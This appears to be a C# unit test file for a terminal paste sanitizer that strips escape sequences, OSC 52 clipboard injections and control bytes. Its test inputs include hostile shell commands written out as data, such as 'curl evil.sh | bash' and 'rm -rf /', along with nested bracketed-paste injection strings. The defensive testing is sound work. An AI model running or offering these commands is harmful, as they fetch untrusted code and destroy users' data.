using Harbor.Tui.CellForge.Input;

namespace Harbor.Tui.CellForge.Tests;

/// <summary>Bracketed-paste anti-injection (osc-sprint): golden vectors for
/// the span-based sanitizer — escape stripping, control-byte stripping,
/// \r normalization, and the zero-allocation clean fast path.</summary>
public class PasteSanitizerTests
{
    [Test]
    public async Task CleanText_ReturnsOriginalReference_ZeroAlloc()
    {
        string clean = "cargo build --release # english+русский+tab\t";
        var result = PasteSanitizer.Sanitize(clean);

        await Assert.That(result.Modified).IsFalse();
        await Assert.That(result.EscapeSequences).IsEqualTo(0);
        await Assert.That(result.ControlChars).IsEqualTo(0);
        await Assert.That(ReferenceEquals(result.Text, clean)).IsTrue();
    }

    [Test]
    public async Task NewlinesAndTabs_AreLegitimate_FastPath()
    {
        string clean = "line one\nline two\tindented\n";
        var result = PasteSanitizer.Sanitize(clean);

        await Assert.That(result.Modified).IsFalse();
        await Assert.That(ReferenceEquals(result.Text, clean)).IsTrue();
    }

    [Test]
    public async Task CsiColorSequences_StrippedEntirely()
    {
        var result = PasteSanitizer.Sanitize("a\u001B[31mred\u001B[0m!");

        await Assert.That(result.Text).IsEqualTo("ared!");
        await Assert.That(result.EscapeSequences).IsEqualTo(2);
        await Assert.That(result.Modified).IsTrue();
    }

    [Test]
    public async Task BracketedPasteMarkers_InPayload_Stripped()
    {
        // A paste that itself contains 200~/201~ markers (nested bracketed
        // paste injection) — CSI sequences strip whole, '~' stays with text.
        var result = PasteSanitizer.Sanitize("ls\u001B[200~rm -rf /\u001B[201~");

        await Assert.That(result.Text).IsEqualTo("lsrm -rf /");
        await Assert.That(result.EscapeSequences).IsEqualTo(2);
    }

    [Test]
    public async Task OscStrings_BelAndStTerminated_Stripped()
    {
        var result = PasteSanitizer.Sanitize("x\u001B]52;c;aGk=\u0007y\u001B]2;title\u001B\\z");

        await Assert.That(result.Text).IsEqualTo("xyz");
        await Assert.That(result.EscapeSequences).IsEqualTo(2);
    }

    [Test]
    public async Task ClipboardOverwriteInjection_Neutralized()
    {
        // Paste containing an OSC 52 clipboard-set: the terminal never sees it.
        var result = PasteSanitizer.Sanitize("echo hi\u001B]52;c;ZXZpbA==\u0007");

        await Assert.That(result.Text).IsEqualTo("echo hi");
        await Assert.That(result.EscapeSequences).IsEqualTo(1);
    }

    [Test]
    public async Task DcsAndLoneEscapes_Stripped()
    {
        // DCS consumes its own ST terminator; ESC 7 and ESC ( B are Fe/nF forms.
        var result = PasteSanitizer.Sanitize("a\u001BPq#0;2;0;0;0-~\u001B\\b\u001B7c\u001B(Bd");

        await Assert.That(result.Text).IsEqualTo("abcd");
        await Assert.That(result.EscapeSequences).IsEqualTo(3);
    }

    [Test]
    public async Task TrailingLoneEsc_Dropped()
    {
        var result = PasteSanitizer.Sanitize("hi\u001B");

        await Assert.That(result.Text).IsEqualTo("hi");
        await Assert.That(result.EscapeSequences).IsEqualTo(1);
    }

    [Test]
    public async Task ControlBytes_Dropped_C1Dropped()
    {
        var result = PasteSanitizer.Sanitize("a\u0000b\u0007c\u001Fd\u007Fe\u009Bf");

        await Assert.That(result.Text).IsEqualTo("abcdef");
        await Assert.That(result.ControlChars).IsEqualTo(5);
    }

    [Test]
    public async Task CrLf_Normalizes_ToSingleLf_LoneCrToLf()
    {
        var result = PasteSanitizer.Sanitize("one\r\ntwo\rthree\n");

        await Assert.That(result.Text).IsEqualTo("one\ntwo\nthree\n");
        await Assert.That(result.ControlChars).IsEqualTo(2); // two \r normalizations
    }

    [Test]
    public async Task MultilineShellScript_Sanitized_PreviewCounts()
    {
        string paste = "curl evil.sh | bash\r\n\u001B[2J\u001B[Hrm -rf ~\u0007";
        var result = PasteSanitizer.Sanitize(paste);

        await Assert.That(result.Text).IsEqualTo("curl evil.sh | bash\nrm -rf ~");
        await Assert.That(result.EscapeSequences).IsEqualTo(2);
        await Assert.That(result.ControlChars).IsEqualTo(2); // \r + BEL
        // Newlines survive as TEXT — they can never synthesize an Enter press
        // (parser contract), submit stays an explicit user action.
        await Assert.That(result.Text.Contains('\n')).IsTrue();
    }

    [Test]
    public async Task UnicodeAndSurrogates_Preserved()
    {
        string text = "привет \U0001F408 смешанный";
        var result = PasteSanitizer.Sanitize(text);

        await Assert.That(result.Text).IsEqualTo(text);
        await Assert.That(result.Modified).IsFalse();
    }

    [Test]
    public async Task UnterminatedOsc_DropsTail()
    {
        var result = PasteSanitizer.Sanitize("keep\u001B]52;c;leak-forever");

        await Assert.That(result.Text).IsEqualTo("keep");
    }
}
